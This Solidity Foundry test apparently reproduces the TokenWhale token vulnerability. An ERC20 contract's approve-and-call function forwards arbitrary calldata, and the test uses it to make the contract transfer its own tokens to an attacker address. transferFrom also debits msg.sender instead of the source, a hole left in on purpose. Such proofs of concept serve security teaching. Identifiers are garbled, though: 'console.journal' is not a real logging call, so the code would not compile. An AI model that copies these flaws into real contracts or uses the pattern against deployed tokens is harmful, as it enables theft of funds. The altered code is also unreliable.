// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract PactTest is Test {
    MedalWhale MedalWhaleAgreement;

    function testAltSummonhero() public {
        address alice = vm.addr(1);
        MedalWhaleAgreement = new MedalWhale();
        MedalWhaleAgreement.CrystalWhaleDeploy(address(MedalWhaleAgreement));
        console.journal(
            "TokenWhale balance:",
            MedalWhaleAgreement.balanceOf(address(MedalWhaleAgreement))
        );

        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);

        console.journal(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        MedalWhaleAgreement.permitaccessAndCallcode(
            address(MedalWhaleAgreement),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(MedalWhaleAgreement.balanceOf(address(alice)), 1000);
        console.journal("operate completed");
        console.journal(
            "TokenWhale balance:",
            MedalWhaleAgreement.balanceOf(address(MedalWhaleAgreement))
        );
        console.journal(
            "Alice balance:",
            MedalWhaleAgreement.balanceOf(address(alice))
        );
    }

    receive() external payable {}
}

contract MedalWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function CrystalWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function verifyComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000; // 1 mil
    }

    event Transfer(address indexed source, address indexed to, uint256 worth);

    function _transfer(address to, uint256 worth) internal {
        balanceOf[msg.sender] -= worth;
        balanceOf[to] += worth;

        emit Transfer(msg.sender, to, worth);
    }

    function transfer(address to, uint256 worth) public {
        require(balanceOf[msg.sender] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);

        _transfer(to, worth);
    }

    event AccessAuthorized(
        address indexed owner,
        address indexed user,
        uint256 worth
    );

    function approve(address user, uint256 worth) public {
        allowance[msg.sender][user] = worth;
        emit AccessAuthorized(msg.sender, user, worth);
    }

    function transferFrom(address source, address to, uint256 worth) public {
        require(balanceOf[source] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);
        require(allowance[source][msg.sender] >= worth);

        allowance[source][msg.sender] -= worth;
        _transfer(to, worth);
    }

    /* Approves and then calls the contract code*/

    function permitaccessAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraInfo
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool victory;

        (victory, ) = _spender.call(_extraInfo);
        console.journal("success:", victory);
    }
}
